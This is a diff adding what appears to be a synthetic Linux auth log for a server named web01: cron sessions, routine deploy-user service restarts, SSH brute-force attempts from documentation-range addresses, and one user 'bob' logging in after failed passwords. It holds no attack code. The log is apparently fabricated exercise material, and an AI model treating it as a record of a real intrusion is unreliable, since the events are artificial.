@@ -1,0 +1,763 @@
+Mar 14 00:00:01 web01 CRON[41485]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:00:02 web01 CRON[41485]: pam_unix(cron:session): session closed for user root
+Mar 14 00:05:39 web01 sshd[46721]: Accepted publickey for deploy from 10.0.5.10 port 53384 ssh2
+Mar 14 00:05:39 web01 sshd[46721]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 00:05:59 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 00:10:01 web01 CRON[61655]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:10:02 web01 CRON[61655]: pam_unix(cron:session): session closed for user root
+Mar 14 00:14:00 web01 sshd[51288]: Invalid user ubuntu from 192.0.2.41 port 54533
+Mar 14 00:14:00 web01 sshd[51288]: Failed password for invalid user ubuntu from 192.0.2.41 port 54533 ssh2
+Mar 14 00:15:36 web01 sshd[6845]: Invalid user ubuntu from 192.0.2.41 port 57654
+Mar 14 00:15:36 web01 sshd[6845]: Failed password for invalid user ubuntu from 192.0.2.41 port 57654 ssh2
+Mar 14 00:17:05 web01 sshd[1844]: Invalid user test from 192.0.2.41 port 57543
+Mar 14 00:17:05 web01 sshd[1844]: Failed password for invalid user test from 192.0.2.41 port 57543 ssh2
+Mar 14 00:20:01 web01 CRON[35948]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:20:02 web01 CRON[35948]: pam_unix(cron:session): session closed for user root
+Mar 14 00:22:00 web01 sshd[5433]: Invalid user user from 198.51.100.147 port 49698
+Mar 14 00:22:00 web01 sshd[5433]: Failed password for invalid user user from 198.51.100.147 port 49698 ssh2
+Mar 14 00:30:01 web01 CRON[47522]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:30:02 web01 CRON[47522]: pam_unix(cron:session): session closed for user root
+Mar 14 00:40:01 web01 CRON[24976]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:40:02 web01 CRON[24976]: pam_unix(cron:session): session closed for user root
+Mar 14 00:49:39 web01 sshd[46721]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 00:50:01 web01 CRON[38419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 00:50:02 web01 CRON[38419]: pam_unix(cron:session): session closed for user root
+Mar 14 01:00:01 web01 CRON[39390]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:00:02 web01 CRON[39390]: pam_unix(cron:session): session closed for user root
+Mar 14 01:05:02 web01 sshd[2981]: Accepted publickey for deploy from 10.0.5.10 port 50461 ssh2
+Mar 14 01:05:02 web01 sshd[2981]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 01:05:22 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 01:10:01 web01 CRON[48965]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:10:02 web01 CRON[48965]: pam_unix(cron:session): session closed for user root
+Mar 14 01:20:01 web01 CRON[11858]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:20:02 web01 CRON[11858]: pam_unix(cron:session): session closed for user root
+Mar 14 01:30:01 web01 CRON[51803]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:30:02 web01 CRON[51803]: pam_unix(cron:session): session closed for user root
+Mar 14 01:40:01 web01 CRON[55026]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:40:02 web01 CRON[55026]: pam_unix(cron:session): session closed for user root
+Mar 14 01:50:01 web01 CRON[22809]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 01:50:02 web01 CRON[22809]: pam_unix(cron:session): session closed for user root
+Mar 14 02:00:01 web01 CRON[26146]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:00:02 web01 CRON[26146]: pam_unix(cron:session): session closed for user root
+Mar 14 02:05:12 web01 sshd[43028]: Accepted publickey for deploy from 10.0.5.10 port 47103 ssh2
+Mar 14 02:05:12 web01 sshd[43028]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 02:05:32 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 02:06:00 web01 sshd[53485]: Invalid user oracle from 198.51.100.180 port 45842
+Mar 14 02:06:00 web01 sshd[53485]: Failed password for invalid user oracle from 198.51.100.180 port 45842 ssh2
+Mar 14 02:06:20 web01 sshd[43206]: Invalid user user from 198.51.100.180 port 34107
+Mar 14 02:06:20 web01 sshd[43206]: Failed password for invalid user user from 198.51.100.180 port 34107 ssh2
+Mar 14 02:09:06 web01 sshd[22061]: Invalid user user from 198.51.100.180 port 52334
+Mar 14 02:09:06 web01 sshd[22061]: Failed password for invalid user user from 198.51.100.180 port 52334 ssh2
+Mar 14 02:10:01 web01 CRON[42607]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:10:02 web01 CRON[42607]: pam_unix(cron:session): session closed for user root
+Mar 14 02:13:07 web01 sshd[50312]: Failed password for root from 203.0.113.45 port 44939 ssh2
+Mar 14 02:13:09 web01 sshd[58109]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 47494 ssh2]
+Mar 14 02:13:20 web01 sshd[57416]: Failed password for root from 203.0.113.45 port 58354 ssh2
+Mar 14 02:13:22 web01 sshd[35453]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 53756 ssh2]
+Mar 14 02:13:35 web01 sshd[61913]: Failed password for root from 203.0.113.45 port 53264 ssh2
+Mar 14 02:13:37 web01 sshd[39365]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 48483 ssh2]
+Mar 14 02:13:51 web01 sshd[16167]: Failed password for root from 203.0.113.45 port 36944 ssh2
+Mar 14 02:13:53 web01 sshd[16056]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 57123 ssh2]
+Mar 14 02:14:04 web01 sshd[48250]: Invalid user oracle from 198.51.100.180 port 47725
+Mar 14 02:14:04 web01 sshd[48250]: Failed password for invalid user oracle from 198.51.100.180 port 47725 ssh2
+Mar 14 02:14:06 web01 sshd[17843]: Failed password for root from 203.0.113.45 port 39467 ssh2
+Mar 14 02:14:08 web01 sshd[45539]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 37480 ssh2]
+Mar 14 02:14:20 web01 sshd[45503]: Failed password for root from 203.0.113.45 port 51079 ssh2
+Mar 14 02:14:22 web01 sshd[44436]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 48509 ssh2]
+Mar 14 02:14:36 web01 sshd[44164]: Failed password for root from 203.0.113.45 port 58234 ssh2
+Mar 14 02:14:38 web01 sshd[17843]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 34377 ssh2]
+Mar 14 02:14:56 web01 sshd[20387]: Failed password for root from 203.0.113.45 port 54927 ssh2
+Mar 14 02:14:58 web01 sshd[2670]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 43490 ssh2]
+Mar 14 02:15:08 web01 sshd[34923]: Failed password for root from 203.0.113.45 port 43249 ssh2
+Mar 14 02:15:10 web01 sshd[8898]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 58011 ssh2]
+Mar 14 02:15:23 web01 sshd[47960]: Failed password for root from 203.0.113.45 port 34473 ssh2
+Mar 14 02:15:25 web01 sshd[10885]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 53366 ssh2]
+Mar 14 02:15:34 web01 sshd[61084]: Failed password for root from 203.0.113.45 port 53751 ssh2
+Mar 14 02:15:36 web01 sshd[14716]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 49417 ssh2]
+Mar 14 02:15:56 web01 sshd[33743]: Failed password for root from 203.0.113.45 port 38998 ssh2
+Mar 14 02:15:58 web01 sshd[61249]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 56196 ssh2]
+Mar 14 02:16:14 web01 sshd[25451]: Failed password for root from 203.0.113.45 port 46226 ssh2
+Mar 14 02:16:16 web01 sshd[16239]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 38379 ssh2]
+Mar 14 02:16:27 web01 sshd[17101]: Failed password for root from 203.0.113.45 port 33447 ssh2
+Mar 14 02:16:29 web01 sshd[36006]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 51602 ssh2]
+Mar 14 02:16:42 web01 sshd[58010]: Failed password for root from 203.0.113.45 port 38890 ssh2
+Mar 14 02:16:44 web01 sshd[33155]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 51632 ssh2]
+Mar 14 02:17:04 web01 sshd[58482]: Failed password for root from 203.0.113.45 port 43712 ssh2
+Mar 14 02:17:06 web01 sshd[8619]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 60988 ssh2]
+Mar 14 02:17:25 web01 sshd[20980]: Failed password for root from 203.0.113.45 port 36387 ssh2
+Mar 14 02:17:27 web01 sshd[19908]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 51559 ssh2]
+Mar 14 02:17:41 web01 sshd[56009]: Failed password for root from 203.0.113.45 port 33955 ssh2
+Mar 14 02:17:43 web01 sshd[19031]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 47728 ssh2]
+Mar 14 02:17:58 web01 sshd[28442]: Failed password for root from 203.0.113.45 port 43168 ssh2
+Mar 14 02:18:00 web01 sshd[20837]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 59036 ssh2]
+Mar 14 02:18:18 web01 sshd[15497]: Failed password for root from 203.0.113.45 port 57118 ssh2
+Mar 14 02:18:20 web01 sshd[32040]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 36950 ssh2]
+Mar 14 02:20:01 web01 CRON[52748]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:20:02 web01 CRON[52748]: pam_unix(cron:session): session closed for user root
+Mar 14 02:24:02 web01 sshd[2981]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 02:30:01 web01 CRON[24582]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:30:02 web01 CRON[24582]: pam_unix(cron:session): session closed for user root
+Mar 14 02:38:00 web01 sshd[55846]: Invalid user user from 192.0.2.126 port 42517
+Mar 14 02:38:00 web01 sshd[55846]: Failed password for invalid user user from 192.0.2.126 port 42517 ssh2
+Mar 14 02:39:46 web01 sshd[57136]: Invalid user pi from 192.0.2.126 port 58916
+Mar 14 02:39:46 web01 sshd[57136]: Failed password for invalid user pi from 192.0.2.126 port 58916 ssh2
+Mar 14 02:40:01 web01 CRON[61406]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:40:02 web01 CRON[61406]: pam_unix(cron:session): session closed for user root
+Mar 14 02:47:12 web01 sshd[43028]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 02:50:01 web01 CRON[21161]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 02:50:02 web01 CRON[21161]: pam_unix(cron:session): session closed for user root
+Mar 14 03:00:01 web01 CRON[26660]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:00:02 web01 CRON[26660]: pam_unix(cron:session): session closed for user root
+Mar 14 03:05:48 web01 sshd[62798]: Accepted publickey for deploy from 10.0.5.10 port 50663 ssh2
+Mar 14 03:05:48 web01 sshd[62798]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 03:06:08 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 03:10:01 web01 CRON[46686]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:10:02 web01 CRON[46686]: pam_unix(cron:session): session closed for user root
+Mar 14 03:20:01 web01 CRON[14431]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:20:02 web01 CRON[14431]: pam_unix(cron:session): session closed for user root
+Mar 14 03:30:01 web01 CRON[50908]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:30:02 web01 CRON[50908]: pam_unix(cron:session): session closed for user root
+Mar 14 03:40:01 web01 CRON[44009]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:40:02 web01 CRON[44009]: pam_unix(cron:session): session closed for user root
+Mar 14 03:42:00 web01 sshd[3865]: Invalid user admin from 198.51.100.189 port 54417
+Mar 14 03:42:00 web01 sshd[3865]: Failed password for invalid user admin from 198.51.100.189 port 54417 ssh2
+Mar 14 03:42:21 web01 sshd[4644]: Invalid user admin from 198.51.100.189 port 40542
+Mar 14 03:42:21 web01 sshd[4644]: Failed password for invalid user admin from 198.51.100.189 port 40542 ssh2
+Mar 14 03:46:00 web01 sshd[41507]: Failed password for root from 192.0.2.102 port 41456 ssh2
+Mar 14 03:48:48 web01 sshd[62798]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 03:50:01 web01 CRON[57611]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 03:50:02 web01 CRON[57611]: pam_unix(cron:session): session closed for user root
+Mar 14 03:50:13 web01 sshd[19502]: Invalid user pi from 192.0.2.102 port 60273
+Mar 14 03:50:13 web01 sshd[19502]: Failed password for invalid user pi from 192.0.2.102 port 60273 ssh2
+Mar 14 04:00:01 web01 CRON[60788]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:00:02 web01 CRON[60788]: pam_unix(cron:session): session closed for user root
+Mar 14 04:02:00 web01 sshd[41794]: Invalid user admin from 203.0.113.23 port 46752
+Mar 14 04:02:00 web01 sshd[41794]: Failed password for invalid user admin from 203.0.113.23 port 46752 ssh2
+Mar 14 04:05:36 web01 sshd[2520]: Invalid user test from 203.0.113.23 port 47512
+Mar 14 04:05:36 web01 sshd[2520]: Failed password for invalid user test from 203.0.113.23 port 47512 ssh2
+Mar 14 04:05:49 web01 sshd[27371]: Accepted publickey for deploy from 10.0.5.10 port 44521 ssh2
+Mar 14 04:05:49 web01 sshd[27371]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 04:06:09 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 04:08:49 web01 sshd[60328]: Invalid user guest from 203.0.113.23 port 46119
+Mar 14 04:08:49 web01 sshd[60328]: Failed password for invalid user guest from 203.0.113.23 port 46119 ssh2
+Mar 14 04:10:01 web01 CRON[24912]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:10:02 web01 CRON[24912]: pam_unix(cron:session): session closed for user root
+Mar 14 04:12:59 web01 sshd[47849]: Invalid user oracle from 203.0.113.23 port 56657
+Mar 14 04:12:59 web01 sshd[47849]: Failed password for invalid user oracle from 203.0.113.23 port 56657 ssh2
+Mar 14 04:16:17 web01 sshd[23658]: Invalid user postgres from 203.0.113.23 port 48160
+Mar 14 04:16:17 web01 sshd[23658]: Failed password for invalid user postgres from 203.0.113.23 port 48160 ssh2
+Mar 14 04:20:01 web01 CRON[8162]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:20:02 web01 CRON[8162]: pam_unix(cron:session): session closed for user root
+Mar 14 04:20:08 web01 sshd[5514]: Invalid user ubuntu from 203.0.113.23 port 49042
+Mar 14 04:20:08 web01 sshd[5514]: Failed password for invalid user ubuntu from 203.0.113.23 port 49042 ssh2
+Mar 14 04:24:10 web01 sshd[18407]: Invalid user git from 203.0.113.23 port 36046
+Mar 14 04:24:10 web01 sshd[18407]: Failed password for invalid user git from 203.0.113.23 port 36046 ssh2
+Mar 14 04:27:40 web01 sshd[23453]: Invalid user jenkins from 203.0.113.23 port 49462
+Mar 14 04:27:40 web01 sshd[23453]: Failed password for invalid user jenkins from 203.0.113.23 port 49462 ssh2
+Mar 14 04:30:01 web01 CRON[28884]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:30:02 web01 CRON[28884]: pam_unix(cron:session): session closed for user root
+Mar 14 04:30:54 web01 sshd[4142]: Invalid user ftpuser from 203.0.113.23 port 40064
+Mar 14 04:30:54 web01 sshd[4142]: Failed password for invalid user ftpuser from 203.0.113.23 port 40064 ssh2
+Mar 14 04:34:21 web01 sshd[28354]: Invalid user mysql from 203.0.113.23 port 36333
+Mar 14 04:34:21 web01 sshd[28354]: Failed password for invalid user mysql from 203.0.113.23 port 36333 ssh2
+Mar 14 04:36:49 web01 sshd[27371]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 04:37:58 web01 sshd[44006]: Invalid user support from 203.0.113.23 port 35881
+Mar 14 04:37:58 web01 sshd[44006]: Failed password for invalid user support from 203.0.113.23 port 35881 ssh2
+Mar 14 04:40:01 web01 CRON[54768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:40:02 web01 CRON[54768]: pam_unix(cron:session): session closed for user root
+Mar 14 04:40:38 web01 sshd[60528]: Invalid user dev from 203.0.113.23 port 36671
+Mar 14 04:40:38 web01 sshd[60528]: Failed password for invalid user dev from 203.0.113.23 port 36671 ssh2
+Mar 14 04:44:27 web01 sshd[14903]: Invalid user hadoop from 203.0.113.23 port 48369
+Mar 14 04:44:27 web01 sshd[14903]: Failed password for invalid user hadoop from 203.0.113.23 port 48369 ssh2
+Mar 14 04:48:41 web01 sshd[51632]: Invalid user minecraft from 203.0.113.23 port 45805
+Mar 14 04:48:41 web01 sshd[51632]: Failed password for invalid user minecraft from 203.0.113.23 port 45805 ssh2
+Mar 14 04:50:01 web01 CRON[42628]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 04:50:02 web01 CRON[42628]: pam_unix(cron:session): session closed for user root
+Mar 14 04:52:50 web01 sshd[46309]: Invalid user teamspeak from 203.0.113.23 port 47568
+Mar 14 04:52:50 web01 sshd[46309]: Failed password for invalid user teamspeak from 203.0.113.23 port 47568 ssh2
+Mar 14 04:57:10 web01 sshd[22254]: Invalid user nagios from 203.0.113.23 port 40824
+Mar 14 04:57:10 web01 sshd[22254]: Failed password for invalid user nagios from 203.0.113.23 port 40824 ssh2
+Mar 14 05:00:01 web01 CRON[27131]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:00:02 web01 CRON[27131]: pam_unix(cron:session): session closed for user root
+Mar 14 05:00:21 web01 sshd[52591]: Invalid user backup from 203.0.113.23 port 42124
+Mar 14 05:00:21 web01 sshd[52591]: Failed password for invalid user backup from 203.0.113.23 port 42124 ssh2
+Mar 14 05:04:33 web01 sshd[36944]: Invalid user www from 203.0.113.23 port 35592
+Mar 14 05:04:33 web01 sshd[36944]: Failed password for invalid user www from 203.0.113.23 port 35592 ssh2
+Mar 14 05:05:19 web01 sshd[59449]: Accepted publickey for deploy from 10.0.5.10 port 47188 ssh2
+Mar 14 05:05:19 web01 sshd[59449]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 05:05:39 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 05:07:43 web01 sshd[32484]: Invalid user tomcat from 203.0.113.23 port 40186
+Mar 14 05:07:43 web01 sshd[32484]: Failed password for invalid user tomcat from 203.0.113.23 port 40186 ssh2
+Mar 14 05:10:01 web01 CRON[59990]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:10:02 web01 CRON[59990]: pam_unix(cron:session): session closed for user root
+Mar 14 05:11:30 web01 sshd[53052]: Invalid user ansible from 203.0.113.23 port 60235
+Mar 14 05:11:30 web01 sshd[53052]: Failed password for invalid user ansible from 203.0.113.23 port 60235 ssh2
+Mar 14 05:12:00 web01 sshd[51857]: Invalid user test from 198.51.100.169 port 42694
+Mar 14 05:12:00 web01 sshd[51857]: Failed password for invalid user test from 198.51.100.169 port 42694 ssh2
+Mar 14 05:13:07 web01 sshd[26237]: Invalid user oracle from 198.51.100.169 port 56566
+Mar 14 05:13:07 web01 sshd[26237]: Failed password for invalid user oracle from 198.51.100.169 port 56566 ssh2
+Mar 14 05:14:03 web01 sshd[1099]: Invalid user docker from 203.0.113.23 port 37000
+Mar 14 05:14:03 web01 sshd[1099]: Failed password for invalid user docker from 203.0.113.23 port 37000 ssh2
+Mar 14 05:16:45 web01 sshd[24242]: Invalid user elastic from 203.0.113.23 port 39423
+Mar 14 05:16:45 web01 sshd[24242]: Failed password for invalid user elastic from 203.0.113.23 port 39423 ssh2
+Mar 14 05:19:16 web01 sshd[41877]: Invalid user ubuntu from 198.51.100.169 port 49593
+Mar 14 05:19:16 web01 sshd[41877]: Failed password for invalid user ubuntu from 198.51.100.169 port 49593 ssh2
+Mar 14 05:20:01 web01 CRON[5282]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:20:02 web01 CRON[5282]: pam_unix(cron:session): session closed for user root
+Mar 14 05:20:29 web01 sshd[42743]: Invalid user steam from 203.0.113.23 port 41638
+Mar 14 05:20:29 web01 sshd[42743]: Failed password for invalid user steam from 203.0.113.23 port 41638 ssh2
+Mar 14 05:24:05 web01 sshd[24049]: Invalid user user1 from 203.0.113.23 port 53311
+Mar 14 05:24:05 web01 sshd[24049]: Failed password for invalid user user1 from 203.0.113.23 port 53311 ssh2
+Mar 14 05:24:42 web01 sshd[51280]: Invalid user test from 198.51.100.169 port 33768
+Mar 14 05:24:42 web01 sshd[51280]: Failed password for invalid user test from 198.51.100.169 port 33768 ssh2
+Mar 14 05:27:08 web01 sshd[34506]: Failed password for root from 203.0.113.23 port 46033 ssh2
+Mar 14 05:30:01 web01 CRON[34121]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:30:02 web01 CRON[34121]: pam_unix(cron:session): session closed for user root
+Mar 14 05:40:01 web01 CRON[46823]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:40:02 web01 CRON[46823]: pam_unix(cron:session): session closed for user root
+Mar 14 05:50:01 web01 CRON[44786]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 05:50:02 web01 CRON[44786]: pam_unix(cron:session): session closed for user root
+Mar 14 06:00:01 web01 CRON[23813]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:00:02 web01 CRON[23813]: pam_unix(cron:session): session closed for user root
+Mar 14 06:05:24 web01 sshd[64287]: Accepted publickey for deploy from 10.0.5.10 port 53626 ssh2
+Mar 14 06:05:24 web01 sshd[64287]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 06:05:44 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 06:10:01 web01 CRON[59217]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:10:02 web01 CRON[59217]: pam_unix(cron:session): session closed for user root
+Mar 14 06:20:01 web01 CRON[27449]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:20:02 web01 CRON[27449]: pam_unix(cron:session): session closed for user root
+Mar 14 06:22:19 web01 sshd[59449]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 06:30:01 web01 CRON[27435]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:30:02 web01 CRON[27435]: pam_unix(cron:session): session closed for user root
+Mar 14 06:34:00 web01 sshd[8690]: Invalid user test from 198.51.100.112 port 53112
+Mar 14 06:34:00 web01 sshd[8690]: Failed password for invalid user test from 198.51.100.112 port 53112 ssh2
+Mar 14 06:37:46 web01 sshd[21709]: Invalid user test from 198.51.100.112 port 49358
+Mar 14 06:37:46 web01 sshd[21709]: Failed password for invalid user test from 198.51.100.112 port 49358 ssh2
+Mar 14 06:38:48 web01 sshd[17889]: Invalid user ubuntu from 198.51.100.112 port 60952
+Mar 14 06:38:48 web01 sshd[17889]: Failed password for invalid user ubuntu from 198.51.100.112 port 60952 ssh2
+Mar 14 06:40:01 web01 CRON[53534]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:40:02 web01 CRON[53534]: pam_unix(cron:session): session closed for user root
+Mar 14 06:50:01 web01 CRON[49335]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 06:50:02 web01 CRON[49335]: pam_unix(cron:session): session closed for user root
+Mar 14 06:55:00 web01 sshd[15892]: Invalid user ubuntu from 198.51.100.10 port 37662
+Mar 14 06:55:00 web01 sshd[15892]: Failed password for invalid user ubuntu from 198.51.100.10 port 37662 ssh2
+Mar 14 06:56:24 web01 sshd[64287]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 07:00:01 web01 CRON[53433]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:00:02 web01 CRON[53433]: pam_unix(cron:session): session closed for user root
+Mar 14 07:05:09 web01 sshd[41872]: Accepted publickey for deploy from 10.0.5.10 port 59649 ssh2
+Mar 14 07:05:09 web01 sshd[41872]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 07:05:29 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 07:10:01 web01 CRON[21371]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:10:02 web01 CRON[21371]: pam_unix(cron:session): session closed for user root
+Mar 14 07:20:01 web01 CRON[44499]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:20:02 web01 CRON[44499]: pam_unix(cron:session): session closed for user root
+Mar 14 07:30:01 web01 CRON[2168]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:30:02 web01 CRON[2168]: pam_unix(cron:session): session closed for user root
+Mar 14 07:34:00 web01 sshd[2335]: Invalid user pi from 198.51.100.108 port 46698
+Mar 14 07:34:00 web01 sshd[2335]: Failed password for invalid user pi from 198.51.100.108 port 46698 ssh2
+Mar 14 07:38:47 web01 sshd[36826]: Failed password for root from 198.51.100.108 port 57552 ssh2
+Mar 14 07:40:01 web01 CRON[55559]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:40:02 web01 CRON[55559]: pam_unix(cron:session): session closed for user root
+Mar 14 07:43:09 web01 sshd[41872]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 07:50:01 web01 CRON[24145]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 07:50:02 web01 CRON[24145]: pam_unix(cron:session): session closed for user root
+Mar 14 08:00:01 web01 CRON[39958]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:00:02 web01 CRON[39958]: pam_unix(cron:session): session closed for user root
+Mar 14 08:05:48 web01 sshd[49909]: Accepted publickey for deploy from 10.0.5.10 port 40524 ssh2
+Mar 14 08:05:48 web01 sshd[49909]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 08:06:08 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 08:10:01 web01 CRON[8768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:10:02 web01 CRON[8768]: pam_unix(cron:session): session closed for user root
+Mar 14 08:20:01 web01 CRON[31207]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:20:02 web01 CRON[31207]: pam_unix(cron:session): session closed for user root
+Mar 14 08:30:01 web01 CRON[17146]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:30:02 web01 CRON[17146]: pam_unix(cron:session): session closed for user root
+Mar 14 08:40:01 web01 CRON[63754]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:40:02 web01 CRON[63754]: pam_unix(cron:session): session closed for user root
+Mar 14 08:47:00 web01 sshd[12486]: Failed password for bob from 10.0.1.22 port 58678 ssh2
+Mar 14 08:47:09 web01 sshd[13635]: Failed password for bob from 10.0.1.22 port 38087 ssh2
+Mar 14 08:47:20 web01 sshd[16535]: Accepted password for bob from 10.0.1.22 port 57403 ssh2
+Mar 14 08:47:20 web01 sshd[16535]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Mar 14 08:50:01 web01 CRON[12220]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 08:50:02 web01 CRON[12220]: pam_unix(cron:session): session closed for user root
+Mar 14 08:57:48 web01 sshd[49909]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 09:00:01 web01 CRON[53148]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:00:02 web01 CRON[53148]: pam_unix(cron:session): session closed for user root
+Mar 14 09:03:00 web01 sshd[41524]: Invalid user test from 198.51.100.171 port 39841
+Mar 14 09:03:00 web01 sshd[41524]: Failed password for invalid user test from 198.51.100.171 port 39841 ssh2
+Mar 14 09:05:45 web01 sshd[6625]: Accepted publickey for deploy from 10.0.5.10 port 47866 ssh2
